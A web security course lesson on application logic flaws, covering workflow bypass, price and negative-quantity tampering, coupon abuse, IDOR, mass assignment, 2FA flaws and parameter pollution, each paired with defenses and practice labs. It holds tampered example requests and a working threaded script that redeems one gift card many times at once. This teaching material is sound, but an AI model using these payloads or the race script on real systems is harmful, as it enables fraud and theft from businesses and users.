# Application Logic Flaws

## When the Code Works Exactly as Written, But Not as Intended

---

## What Are Logic Flaws?

Logic flaws are vulnerabilities that arise from **faulty application design** rather than coding errors. The code executes correctly, but the business logic can be abused.

- Scanners **cannot** detect them (no signatures)
- Require **understanding** of business processes
- Often **unique** to each application
- Can have **severe** business impact

---

## Categories of Logic Flaws

```misc
1. Workflow Bypass
   - Skipping steps in multi-step processes

1. Price/Value Manipulation
   - Modifying prices, quantities, discount codes

1. Race Conditions
   - Exploiting timing between checks and actions

1. Access Control Logic
   - IDOR, privilege escalation through logic

1. Business Rule Bypass
   - Circumventing intended restrictions

1. State Management
   - Manipulating application state
```

---

## Workflow Bypass

```misc
Normal checkout flow:
  Cart -> Address -> Payment -> Confirmation -> Order

Attack: Skip the payment step
  Cart -> Address -> [skip] -> Confirmation -> Order

How:
1. Complete Cart and Address steps
1. Note the URL/request for Confirmation step
1. Navigate directly to Confirmation
1. If the server doesn't verify payment was completed...
   Order is placed without payment!

Defense:
- Server-side state machine
- Verify ALL previous steps completed
- Cryptographic tokens linking steps
```

---

## Price Manipulation

```http
# Intercepted checkout request
POST /api/checkout HTTP/1.1
Content-Type: application/json

{
  "items": [
    {"id": 101, "name": "Laptop", "price": 999.99, "qty": 1}
  ],
  "total": 999.99
}

# Attack: Modify price in request
{
  "items": [
    {"id": 101, "name": "Laptop", "price": 0.01, "qty": 1}
  ],
  "total": 0.01
}

# Defense: NEVER trust client-supplied prices
# Always calculate prices server-side from product catalog
```

---

## Negative Quantity / Value Attacks

```http
# Adding negative quantities
POST /api/cart
{"product_id": 1, "quantity": -5, "price": 100}
# Total: -$500 (credit to attacker!)

# Negative transfer amount
POST /api/transfer
{"from": "attacker", "to": "victim", "amount": -500}
# Actually transfers $500 FROM victim TO attacker

# Integer overflow
POST /api/cart
{"product_id": 1, "quantity": 2147483647}
# May overflow to negative number

# Defense:
# - Validate quantity > 0
# - Validate amount > 0
# - Use unsigned integers where appropriate
# - Add maximum value checks
```

---

## Coupon / Discount Abuse

```misc
Attack 1: Reusing single-use coupons
  Apply coupon -> Remove item -> Add item -> Coupon still active

Attack 2: Stacking incompatible discounts
  Apply SAVE20 + SAVE30 = 50% off
  (Should only allow one discount)

Attack 3: Coupon code prediction
  SUMMER2024-001, SUMMER2024-002, ...
  Brute-force sequential codes

Attack 4: Race condition on coupon redemption
  Send 10 simultaneous requests to apply same single-use coupon
  Some may succeed before the coupon is marked as used

Defense:
  - Server-side discount calculation
  - Atomic coupon redemption (database locking)
  - Random, non-sequential coupon codes
  - Verify discount rules at checkout time
```

---

## Race Conditions

```python
# VULNERABLE: Time-of-check to Time-of-use (TOCTOU)

@app.route('/transfer', methods=['POST'])
def transfer():
    amount = int(request.form['amount'])

    # CHECK: Does user have enough balance?
    balance = get_balance(current_user)  # Thread 1: balance=100
    if balance >= amount:                # Thread 1: 100 >= 100 ✓
                                         # Thread 2 also checks: 100 >= 100 ✓
        # USE: Perform the transfer
        deduct(current_user, amount)     # Thread 1: 100-100=0
                                         # Thread 2: 0-100=-100 (!!)
        credit(target_user, amount)

# SECURE: Use database-level locking
def transfer_secure(user_id, amount):
    with db.begin():  # Transaction
        balance = db.execute(
            "SELECT balance FROM accounts WHERE id = %s FOR UPDATE",
            (user_id,))  # Row lock
        if balance >= amount:
            db.execute("UPDATE accounts SET balance = balance - %s WHERE id = %s",
                      (amount, user_id))
```

---

## IDOR (Insecure Direct Object Reference)

```http
# Horizontal privilege escalation
GET /api/users/123/profile     -> Your profile
GET /api/users/124/profile     -> Someone else's profile!

# Vertical privilege escalation
GET /api/users/123/role        -> {"role": "user"}
PUT /api/users/123/role        -> {"role": "admin"}

# Indirect references
GET /api/invoices/INV-001      -> Your invoice
GET /api/invoices/INV-002      -> Another customer's invoice!

# Defense:
# 1. Verify ownership: Does user 123 own resource X?
# 1. Use indirect references (UUID instead of sequential IDs)
# 1. Check authorization on EVERY request
# 1. Don't expose internal IDs in URLs
```

---

## Mass Assignment / Parameter Pollution

```python
# Mass Assignment - adding unexpected fields

# User registration
POST /api/register
{"username": "hacker", "password": "pass123", "role": "admin"}
#                                               ^^^^^^^^^^^^
#                          Server blindly assigns all fields!

# VULNERABLE Python/Django code
class User(models.Model):
    username = models.CharField()
    password = models.CharField()
    role = models.CharField(default='user')
    is_admin = models.BooleanField(default=False)

# View directly updates from POST data
def register(request):
    user = User(**request.POST.dict())  # All fields accepted!
    user.save()

# SECURE: Whitelist allowed fields
def register(request):
    user = User(
        username=request.POST['username'],
        password=hash(request.POST['password'])
        # role and is_admin intentionally NOT included
    )
```

---

## Business Logic Bypass Examples

![business_logic_bypass_examples](svg/courses/security/web-application-hacking/16_logic_flaws/business_logic_bypass_examples.svg)

---

## Testing for Logic Flaws - Methodology

```misc
1. Understand the application's business logic
   - What are the workflows?
   - What are the business rules?
   - What are the constraints?

1. Map every multi-step process
   - What happens if you skip a step?
   - What happens if you repeat a step?
   - What happens if you go backwards?

1. Identify trust assumptions
   - Where does the app trust client data?
   - Where are prices/quantities calculated?
   - Where are permissions checked?

1. Test boundary conditions
   - Zero, negative, very large values
   - Empty strings, null values
   - Special characters in unexpected fields

1. Test concurrency
   - Send simultaneous requests
   - Check for race conditions
```

---

## Race Condition - Double Spending Attack

```python
# Scenario: Gift card redemption
# Attack: Redeem same gift card simultaneously

import requests
import threading

TARGET = "http://target.com/api/redeem"
HEADERS = {"Cookie": "session=abc123"}
PAYLOAD = {"code": "GIFT-CARD-500"}

def redeem():
    r = requests.post(TARGET, json=PAYLOAD, headers=HEADERS)
    print(f"Status: {r.status_code}, Response: {r.text[:100]}")

# Send 20 simultaneous redemption requests
threads = [threading.Thread(target=redeem) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Multiple redemptions may succeed before the card is invalidated
# Result: $500 gift card redeemed multiple times

# Defense: Use database locking (SELECT FOR UPDATE)
# Or atomic operations (Redis SETNX for single-use codes)
```

---

## Authorization Bypass Patterns

![authorization_bypass_patterns](svg/courses/security/web-application-hacking/16_logic_flaws/authorization_bypass_patterns.svg)

---

## Preventing Logic Flaws

```python
# 1. Server-side state machine for workflows
class CheckoutStateMachine:
    STATES = ['cart', 'address', 'payment', 'confirm', 'complete']

    def transition(self, session, next_state):
        current = session.get('checkout_state', 'cart')
        current_idx = self.STATES.index(current)
        next_idx = self.STATES.index(next_state)

        # Can only move forward by exactly one step
        if next_idx != current_idx + 1:
            raise InvalidTransition(
                f"Cannot go from {current} to {next_state}")

        session['checkout_state'] = next_state

# 2. Always validate business rules server-side
def process_order(order):
    # Recalculate price from catalog (never trust client)
    for item in order.items:
        item.price = get_catalog_price(item.product_id)
    order.total = sum(i.price * i.quantity for i in order.items)

    # Validate quantities
    for item in order.items:
        if item.quantity <= 0 or item.quantity > 100:
            raise ValidationError("Invalid quantity")
```

---

## Lab: Logic Flaw Hunting

**Exercises**:

1. **DVWA** - Test for `IDOR` in user profile pages
1. **Juice Shop** - Place an order with modified prices
1. **Juice Shop** - Apply coupon codes multiple times
1. **WebGoat** - Complete the "Insecure Direct Object References" lesson
1. **Custom**: Identify 3 logic flaws in any practice app

```misc
Checklist:
[ ] Can I modify prices in transit?
[ ] Can I skip workflow steps?
[ ] Can I access other users' data?
[ ] Can I perform actions I shouldn't?
[ ] Can I exploit timing issues?
```

---

## Two-Factor Authentication Logic Flaws

```misc
Flaw 1: 2FA code accepted for any user
  - Login as User A
  - At 2FA step, change user identifier to User B
  - Enter User A's valid 2FA code
  - Server accepts code for User B (no user binding!)

Flaw 2: 2FA verified separately from session
  - Login with valid credentials
  - Server sets session cookie before 2FA check
  - Skip 2FA page entirely
  - Navigate directly to authenticated pages

Flaw 3: 2FA backup code brute-force
  - Backup codes: 8-digit numbers
  - No rate limiting on backup code attempts
  - Brute-force 10^8 combinations

Flaw 4: 2FA via email with token in URL
  - Token sent: https://target.com/verify?token=123456
  - Token appears in Referer header when clicking links
  - Third-party services receive the token
```

---

## HTTP Parameter Pollution (HPP)

```http
# HPP: Sending the same parameter multiple times
# Different servers handle duplicates differently

# Behavior varies:
# PHP:      Uses LAST value     id=1&id=2  -> id=2
# ASP.NET:  Comma-joins values  id=1&id=2  -> id=1,2
# Python:   Uses FIRST value    id=1&id=2  -> id=1
# Node.js:  Array of values     id=1&id=2  -> id=[1,2]

# Attack: WAF bypass via HPP
# WAF checks first parameter, app uses last
GET /transfer?amount=100&to=safe_account&amount=1000000

# Attack: Logic bypass
# Server processes both values differently
POST /payment
amount=100&discount=0&amount=-50
# If server adds both amounts: 100 + (-50) = 50

# Defense: Explicitly handle duplicate parameters
# Use framework functions that return single values
```

---

## Summary

- Logic flaws cannot be found by automated scanners
- Business logic understanding is essential for testing
- Common flaws: workflow bypass, price manipulation, race conditions
- `IDOR` is one of the most common and impactful flaws
- Mass assignment allows adding unexpected fields
- Test every multi-step process for step-skipping
- Defense requires server-side validation of ALL business rules

> Next: OS & Server Hardening
